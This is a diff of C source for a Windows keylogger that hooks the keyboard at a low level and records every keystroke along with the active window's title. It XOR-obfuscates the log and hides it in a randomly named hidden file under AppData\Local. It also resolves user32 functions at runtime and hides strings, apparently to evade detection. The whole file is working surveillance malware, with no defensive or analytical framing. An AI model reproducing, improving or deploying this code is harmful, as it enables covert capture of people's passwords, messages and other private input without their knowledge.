@@ -1,255 +1,390 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
 #include <time.h>
+#include <dirent.h>
+#include <sys/stat.h>
+#include <sys/types.h>
 #include <windows.h>
 #include "types.h"
-#include "keylogger.h"
-// 
-uint8 key_dataPlus[KEY_DATAPLUS_LEN][3] = {  { 0x31, '1', '!' },
-									{ 0x32, '2', '@' },
-									{ 0x33, '3', '#' },
-									{ 0x34, '4', '$' },
-									{ 0x35, '5', '%' },
-									{ 0x36, '6', '^' },
-									{ 0x37, '7', '&' },
-									{ 0x38, '8', '*' },
-									{ 0x39, '9', '(' },
-									{ 0x30, '0', ')' },
-									{ 0xBD, '-', '_' },
-									{ 0xBB, '=', '+' },
-									{ 0xC0, '`', '~' },
-									{ 0xDB, '[', '{' },
-									{ 0xDD, ']', '}' },
-									{ 0xBA, ';', ':' },
-									{ 0xDE, '\'', '\"' },
-									{ 0xDC, '\\', '|' },
-									{ 0xE2, '\\', '|' },
-									{ 0xBC, ',', '<' },
-									{ 0xBE, '.', '>' },
-									{ 0xBF, '/', '?' }
-									};
-int keylogger_isCtrlOn = 0;
-int keylogger_isCapsOn = 0;
-int keylogger_isShiftOn = 0;
+#include "keylogger/keylogger.h"
+#include "keylogger/error.h"
+#include "random.h"
+#include "memProtect.h"
+#include "loadLibrary.h"
+
+#define KEYLOGGER_EMPTY_KEY 0xFFFF
+
+#define KEYLOGGER_KEY_CTRL_L 0xA2
+#define KEYLOGGER_KEY_CTRL_R 0xA3
+#define KEYLOGGER_KEY_SHIFT_L 0xA0
+#define KEYLOGGER_KEY_SHIFT_R 0xA1
+#define KEYLOGGER_KEY_CAPS_LOCK 0x14
+
+#define KEYLOGGER_TABLE_CTRL 0x0
+#define KEYLOGGER_TABLE_SHIFT 0x1
+#define KEYLOGGER_TABLE_CAPS_LOCK 0x2
+
+uint8 keylogger_SpecKey;
+char* keylogger_FilePath = NULL;
+char keylogger_LastFocusTitle[0xFF];
+
+int keylogger_IsBlocking = 0;
 int keylogger_IsRunning = 0;
-char keylogger_CMD  = KEYLOGGER_CMD_NONE;
-char* keylogger_path;
-HWND keylogger_appFocus = 0;
-FILE *flog;
+long keylogger_LastTime = 0;
+long keylogger_curTime = 0;
+uint8 keylogger_XorKey = 0;
+uint16 keylogger_LastKey = KEYLOGGER_EMPTY_KEY;
+uint32 keylogger_LastError = KEYLOGGER_NO_ERROR;
+FILE* keylogger_F;
+HWND keylogger_focus;
 
-void keylogger_PrepareToRead(void)
+HMODULE keylogger_lib;
+__SetWindowsHookExA keylogger_lib_SetWindowsHookExA;
+__GetMessageA keylogger_lib_GetMessageA;
+__TranslateMessage keylogger_lib_TranslateMessage;
+__DispatchMessageA keylogger_lib_DispatchMessageA;
+__GetKeyState keylogger_lib_GetKeyState;
+__CallNextHookEx keylogger_lib_CallNextHookEx;
+__GetForegroundWindow keylogger_lib_GetForegroundWindow;
+__GetWindowTextA keylogger_lib_GetWindowTextA;
+
+/*
+ -> We are not encrypting the data, we are hiding it to look line binary, cuz when open you will se what you typed
+*/
+
+int keylogger_isSpec(uint16 key, int isDown)
 {
-	keylogger_CMD  = KEYLOGGER_CMD_BLOCK;
-
-	fclose(flog);
-	flog = fopen(keylogger_path, "rb");
-}
-
-uint64 keylogger_GetSize(void)
-{
-	keylogger_CMD  = KEYLOGGER_CMD_BLOCK;
-
-	uint64 size = ftell(flog);
-
-	keylogger_CMD  = KEYLOGGER_CMD_NONE;
-
-	return size;
-}
-
-void keylogger_Clear(void)
-{
-	keylogger_CMD  = KEYLOGGER_CMD_BLOCK;
-
-	fclose(flog);
-	remove(keylogger_path);
-	flog = fopen(keylogger_path, "a+");
-	fseek(flog, 0, SEEK_END);
-	
-	if(ftell(flog) < 1)
+	if(key == KEYLOGGER_KEY_SHIFT_L || key == KEYLOGGER_KEY_SHIFT_R)
 	{
-		SetFileAttributes(keylogger_path, FILE_ATTRIBUTE_HIDDEN);
-	}
-
-	fputc(KEY_DATA_CMD_STARTED ^ KEY_DATA_XOR_KEY, flog);
-
-	keylogger_CMD  = KEYLOGGER_CMD_NONE;
-}
-
-int key_dataPlusGet(uint8 vkey)
-{
-	if(vkey == KEY_BACKSPACE || vkey == KEY_SPACE || vkey == KEY_TAP || vkey == KEY_ENTER)
-	{
-		return vkey;
-	}
-	
-	int i;
-
-	for(i = 0; i != KEY_DATAPLUS_LEN; i++)
-	{
-		if(key_dataPlus[i][0] == vkey)
+		if(isDown)
 		{
-			if(keylogger_isShiftOn)
-			{
-				return key_dataPlus[i][KEY_DATAPLUS_ASCII_SHIFT];
-			}
-
-			return key_dataPlus[i][KEY_DATAPLUS_ASCII];
-		}
-	}
-
-	return KEY_EMPTY; //ignored; not needed ctrl, alt, esc, page up, print screen...
-}
-
-void keyb_hook_focusWindow(void)
-{
-	HWND newwin = GetForegroundWindow();
-
-	if(keylogger_appFocus != newwin)
-	{
-		int bufferLen = 255;
-		char buffer[bufferLen + sizeof(char)];
-		memset(buffer, 0, bufferLen + sizeof(char));
-
-		if(GetWindowText(newwin, buffer, bufferLen))
-		{
-			int i;
-			int buffSize = strlen(buffer);
-			fputc(KEY_DATA_CMD_FOCUSWIN ^ KEY_DATA_XOR_KEY, flog);
-			fputc(buffSize ^ KEY_DATA_XOR_KEY, flog);
-
-			for(i = 0; i != buffSize; i++)
-			{
-				fputc(buffer[i] ^ KEY_DATA_XOR_KEY, flog);
-			}
+			keylogger_SpecKey |= 0x1 << KEYLOGGER_TABLE_SHIFT;
+		}else{
+			keylogger_SpecKey &= ~(0x1 << KEYLOGGER_TABLE_SHIFT);
 		}
 
-		keylogger_appFocus = newwin;
-	}
-}
-
-LRESULT CALLBACK keyb_hook(int code, WPARAM wParam, LPARAM lParam)
-{
-	int specialKey = 0;
-	uint8 pkey = KEY_EMPTY;
-
-	KBDLLHOOKSTRUCT *pKeyb = (KBDLLHOOKSTRUCT *)lParam;
-
-	if(keylogger_CMD  != KEYLOGGER_CMD_NONE)
-	{
-		return CallNextHookEx(NULL, code, wParam, lParam);
-	}
-
-	keyb_hook_focusWindow();
-
-	if(wParam == WM_KEYUP)
-	{
-		pkey = (uint8)pKeyb->vkCode & 0xFF;
-
-		if(pkey == KEY_CAPS)
+		return 1;
+	}else if(key == KEYLOGGER_KEY_CTRL_L || key == KEYLOGGER_KEY_CTRL_R){
+		if(isDown)
 		{
-			keylogger_isCapsOn = !keylogger_isCapsOn;
-			specialKey = 1;
-		}else if(pkey == KEY_SHIFT){
-			keylogger_isShiftOn = 0;
-			specialKey = 1;
-		}else if(pkey == KEY_CTRL){
-			keylogger_isCtrlOn = 0;
-			specialKey = 1;
+			keylogger_SpecKey |= 0x1 << KEYLOGGER_TABLE_CTRL;
+		}else{
+			keylogger_SpecKey &= ~(0x1 << KEYLOGGER_TABLE_CTRL);
 		}
 
-		if(!specialKey && !keylogger_isCtrlOn)
+		return 1;
+	}else if(key == KEYLOGGER_KEY_CAPS_LOCK && !isDown){
+		if((keylogger_SpecKey >> KEYLOGGER_TABLE_CAPS_LOCK) & 0x1)
 		{
-			if(pkey >= 'A' && pkey <= 'Z')
-			{
-				if(keylogger_isCapsOn && keylogger_isShiftOn)
-                    {
-                         pkey += 0x20;
-                    }else if(!keylogger_isCapsOn && !keylogger_isShiftOn){
-                         pkey += 0x20;
-				}
-			}else{
-				pkey = key_dataPlusGet(pkey);
-			}
-
-			if(keylogger_CMD == KEYLOGGER_CMD_NONE && pkey != KEY_EMPTY)
-			{
-				fputc(pkey ^ KEY_DATA_XOR_KEY, flog);
-				fflush(flog);
-			}
-		}
-	}else if(wParam == WM_KEYDOWN){
-		pkey = (uint8)pKeyb->vkCode & 0xFF;
-
-		if(pkey == KEY_SHIFT)
-		{
-			keylogger_isShiftOn = 1;
-		}else if(pkey == KEY_CTRL){
-			keylogger_isCtrlOn = 1;
-		}
-	}
-
-	return CallNextHookEx(NULL, code, wParam, lParam);
-}
-
-uint64 __stdcall keylogger_thread_loop(void* args)
-{	
-	MSG msg;
-	HINSTANCE instc = GetModuleHandle(NULL);
-	
-	if(!SetWindowsHookEx(WH_KEYBOARD_LL, keyb_hook, instc, 0))
-	{
-		return 0;
-	}
-	
-	keylogger_IsRunning = 1;
-
-	if((GetKeyState(KEY_CAPS) & 0x0001) != 0)
-	{
-		keylogger_isCapsOn = 1;
-	}
-
-	while(!GetMessage(&msg, NULL, 0, 0))
-	{
-		if(keylogger_CMD  == KEYLOGGER_CMD_BLOCK)
-		{
-			KEYLOGGER_MSG_TIMER();
-
-			continue;
+			keylogger_SpecKey &= ~(0x1 << KEYLOGGER_TABLE_CAPS_LOCK);
+		}else{
+			keylogger_SpecKey |= 0x1 << KEYLOGGER_TABLE_CAPS_LOCK;
 		}
 
-		TranslateMessage(&msg);
-		DispatchMessage(&msg);
+		return 1;
 	}
 
 	return 0;
 }
 
+void keylogger_writeKey(uint16 key)
+{
+	uint8 val = (KEYLOGGER_CMD_KEY & 0xF) | (keylogger_SpecKey & 0xF) << 4;
+	keylogger_LastKey = (val & 0xFF) | (key & 0xFF) << 8;
+
+	fputc(val ^ keylogger_XorKey, keylogger_F);
+	fputc((key & 0xFF) ^ keylogger_XorKey, keylogger_F);
+}
+
+void keylogger_hook_addons(void)
+{
+	time(&keylogger_curTime);
+	
+	if(keylogger_curTime - keylogger_LastTime > KEYLOGGER_MAX_PAUSE)
+	{
+		fputc(KEYLOGGER_CMD_TIME ^ keylogger_XorKey, keylogger_F);
+		fputc(keylogger_curTime & 0xFF, keylogger_F);
+		fputc(((keylogger_curTime >> 8) & 0xFF), keylogger_F);
+		fputc(((keylogger_curTime >> 16) & 0xFF) ^ keylogger_XorKey, keylogger_F);
+		fputc(((keylogger_curTime >> 24) & 0xFF) ^ keylogger_XorKey, keylogger_F);
+	}
+
+	keylogger_LastTime = keylogger_curTime;
+
+	HWND newwin = keylogger_lib_GetForegroundWindow();
+
+	if(keylogger_focus == newwin)
+	{
+		return;
+	}
+	
+	int bufflen = 0xFE;
+	memset(keylogger_LastFocusTitle, 0, 0xFF);
+
+	if(keylogger_lib_GetWindowTextA(newwin, keylogger_LastFocusTitle, bufflen))
+	{
+		int i;
+		int len = strlen(keylogger_LastFocusTitle);
+
+		fputc(KEYLOGGER_CMD_PRG ^ keylogger_XorKey, keylogger_F);
+		fputc((len & 0xFF) ^ keylogger_XorKey, keylogger_F);
+
+		for(i = 0; i != len; i++)
+		{
+			fputc(keylogger_LastFocusTitle[i] ^ keylogger_XorKey, keylogger_F);
+		}
+	}else{
+		keylogger_LastError = KEYLOGGER_ERROR_FOCUS_TITLE;
+	}
+
+	keylogger_focus = newwin;
+}
+
+long __stdcall keylogger_hook(int code, WPARAM wParam, LPARAM lParam)
+{
+	if(keylogger_IsBlocking)
+	{
+		return keylogger_lib_CallNextHookEx(NULL, code, wParam, lParam);
+	}
+
+	keylogger_hook_addons();
+
+	uint16 pkey = KEYLOGGER_EMPTY_KEY;
+
+	KBDLLHOOKSTRUCT *pKeyb = (KBDLLHOOKSTRUCT *)lParam;
+
+	if(wParam == WM_KEYUP)
+	{
+		pkey = pKeyb->vkCode & 0xFF;
+
+		keylogger_isSpec(pkey, 0);
+	}else if(wParam == WM_KEYDOWN){
+		pkey = pKeyb->vkCode & 0xFF;
+		
+		if(!keylogger_isSpec(pkey, 1))
+		{
+			keylogger_writeKey(pkey);
+		}
+	}
+
+	return keylogger_lib_CallNextHookEx(NULL, code, wParam, lParam);
+}
+
+ulong __stdcall keylogger_thread(void* args)
+{
+	MSG msg;
+	HINSTANCE instc = GetModuleHandle(NULL);
+
+	if(!keylogger_lib_SetWindowsHookExA(WH_KEYBOARD_LL, keylogger_hook, instc, 0))
+	{
+		keylogger_LastError = KEYLOGGER_ERROR_SET_HOOK;
+
+		return 0;
+	}
+
+	keylogger_IsRunning = 1;
+
+	if((keylogger_lib_GetKeyState(KEYLOGGER_KEY_CAPS_LOCK) & 0x0001) != 0)
+	{
+		keylogger_SpecKey |= 0x1 << KEYLOGGER_TABLE_CAPS_LOCK;
+	}
+
+	while(keylogger_lib_GetMessageA(&msg, NULL, 0, 0))
+	{
+		if(keylogger_IsBlocking)
+		{
+			KEYLOGGER_BLOCK_CPU_PROTECT();
+
+			continue;
+		}
+
+		keylogger_lib_TranslateMessage(&msg);
+		keylogger_lib_DispatchMessageA(&msg);
+	}
+
+	return 0;
+}
+
+void keylogger_Setup(void)
+{
+	if(!keylogger_XorKey)
+	{
+		keylogger_XorKey = 1 + rand() % 0xFE;
+		fputc(KEYLOGGER_CMD_XOR_KEY, keylogger_F);
+		fputc(keylogger_XorKey, keylogger_F);
+
+		return;
+	}
+
+	keylogger_XorKey = 1 + rand() % 0xFE;
+	fputc(KEYLOGGER_CMD_XOR_KEY, keylogger_F);
+	fputc(keylogger_XorKey, keylogger_F);
+}
+
+int keylogger_GetFile(void)
+{
+	if(keylogger_FilePath)
+	{
+		free(keylogger_FilePath);
+	}
+
+	char* _appPath = (char*)memProtect_Request(MEMPROTECT_APPDATA);
+	char* appPath = getenv(_appPath);
+	free(_appPath);
+	
+	if(!appPath)
+	{
+		keylogger_LastError = KEYLOGGER_ERROR_GET_APPDATA;
+
+		return 0;
+	}
+
+	int appPathLen = strlen(appPath);
+	int dirPathLen = appPathLen + 10;
+	char* dirPath = malloc(dirPathLen + sizeof(char));
+	memset(dirPath, 0, dirPathLen + sizeof(char));
+	strcpy(dirPath, appPath);
+	strcpy(dirPath + appPathLen, "\\..\\Local\\");
+
+	DIR *dir = opendir(dirPath);
+
+	if(!dir)
+	{
+		keylogger_LastError = KEYLOGGER_ERROR_GET_APPDATA;
+		free(dirPath);
+
+		return 0;
+	}
+
+	struct stat fbuf;
+	struct dirent *_dir;
+	int pathLen = 0;
+	char* path = NULL;
+	uint8 sigil[KEYLOGGER_SIGIL_LEN];
+
+	while((_dir = readdir(dir)) != NULL)
+	{
+		pathLen = dirPathLen + _dir->d_namlen;
+		path = malloc(pathLen + sizeof(char));
+		memset(path, 0, pathLen + sizeof(char));
+		strcpy(path, dirPath);
+		strcpy(path + dirPathLen, _dir->d_name);
+
+		if(stat(path, &fbuf) == 0)
+		{
+			if(S_ISREG(fbuf.st_mode))
+			{
+				keylogger_F = fopen(path, "rb");
+				
+				if(keylogger_F && fbuf.st_size >= KEYLOGGER_SIGIL_LEN)
+				{
+					memset(sigil, 0, KEYLOGGER_SIGIL_LEN);
+					fread(sigil, 1, KEYLOGGER_SIGIL_LEN, keylogger_F);
+
+					if(memcmp(sigil, KEYLOGGER_SIGIL, KEYLOGGER_SIGIL_LEN) == 0)
+					{
+						free(dirPath);
+						fclose(keylogger_F);
+						closedir(dir);
+
+						keylogger_F = fopen(path, "a+");
+						keylogger_FilePath = malloc(pathLen + sizeof(char));
+						memset(keylogger_FilePath, 0, pathLen + sizeof(char));
+						strcpy(keylogger_FilePath, path);
+						free(path);
+
+						fseek(keylogger_F, 0, SEEK_END);
+
+						return 1;
+					}
+				}
+			}
+		}
+		
+		free(path);
+	}
+
+	closedir(dir);
+
+	pathLen = dirPathLen + 10;
+	char* rndName = random_Ascii(10);
+	path = malloc(pathLen + sizeof(char));
+	memset(path, 0, pathLen);
+	strcpy(path, dirPath);
+	strcpy(path + dirPathLen, rndName);
+	free(rndName);
+	free(dirPath);
+
+	keylogger_F = fopen(path, "w");
+
+	if(!keylogger_F)
+	{
+		keylogger_LastError = KEYLOGGER_ERROR_GET_APPDATA;
+		free(path);
+
+		return 0;
+	}
+
+	fclose(keylogger_F);
+
+	SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN);
+
+	keylogger_F = fopen(path, "a+");
+	fwrite(KEYLOGGER_SIGIL, 1, KEYLOGGER_SIGIL_LEN, keylogger_F);
+
+	keylogger_FilePath = malloc(pathLen + sizeof(char));
+	memset(keylogger_FilePath, 0, pathLen + sizeof(char));
+	strcpy(keylogger_FilePath, path);
+	free(path);
+
+	return 1;
+}
+
 void keylogger_Start(void)
 {
-	char* prgPath = getenv("APPDATA");
-	
-	if(!prgPath)
+	keylogger_LastError = KEYLOGGER_NO_ERROR;
+
+	if(!keylogger_lib)
+	{
+		keylogger_lib = loadLibrary_Load(lib_User32);
+
+		if(!keylogger_lib)
+		{
+			return;
+		}
+
+		keylogger_lib_SetWindowsHookExA = (__SetWindowsHookExA)loadLibrary_LoadFunc(keylogger_lib, lib_SetWindowsHookExA);
+		keylogger_lib_GetMessageA = (__GetMessageA)loadLibrary_LoadFunc(keylogger_lib, lib_GetMessageA);
+		keylogger_lib_TranslateMessage = (__TranslateMessage)loadLibrary_LoadFunc(keylogger_lib, lib_TranslateMessage);
+		keylogger_lib_DispatchMessageA = (__DispatchMessageA)loadLibrary_LoadFunc(keylogger_lib, lib_DispatchMessageA);
+		keylogger_lib_GetKeyState = (__GetKeyState)loadLibrary_LoadFunc(keylogger_lib, lib_GetKeyState);
+		keylogger_lib_CallNextHookEx = (__CallNextHookEx)loadLibrary_LoadFunc(keylogger_lib, lib_CallNextHookEx);
+		keylogger_lib_GetWindowTextA = (__GetWindowTextA)loadLibrary_LoadFunc(keylogger_lib, lib_GetWindowTextA);
+		keylogger_lib_GetForegroundWindow = (__GetForegroundWindow)loadLibrary_LoadFunc(keylogger_lib, lib_GetForegroundWindow);
+	}
+
+	int i;
+
+	for(i = 0; i != 10; i++)
+	{
+		if(keylogger_GetFile())
+		{
+			break;
+		}
+	}
+
+	if(i >= 10)
 	{
 		return;
 	}
 
-	int pathLen = strlen(prgPath) + strlen(KEYLOGGER_FILE_NAME) + strlen("\\..\\Local\\") + sizeof(char);
-	keylogger_path = malloc(pathLen);
+	keylogger_SpecKey = 0x0;
 
-	snprintf(keylogger_path, pathLen, "%s\\..\\Local\\%s", prgPath, KEYLOGGER_FILE_NAME);
-	free(prgPath);
-
-	flog = fopen(keylogger_path, "a+");
-	fseek(flog, 0, SEEK_END);
+	keylogger_Setup();
+	keylogger_hook_addons();
 	
-	if(ftell(flog) < 1)
+	if(!CreateThread(NULL, 0, keylogger_thread, NULL, 0, NULL))
 	{
-		SetFileAttributes(keylogger_path, FILE_ATTRIBUTE_HIDDEN);
+		keylogger_LastError = KEYLOGGER_ERROR_CREATE_THREAD;
 	}
-
-	fputc(KEY_DATA_CMD_STARTED ^ KEY_DATA_XOR_KEY, flog);
-
-	keylogger_CMD   = KEYLOGGER_CMD_NONE;
-	CreateThread(NULL, 0, keylogger_thread_loop, NULL, 0, NULL);
 }
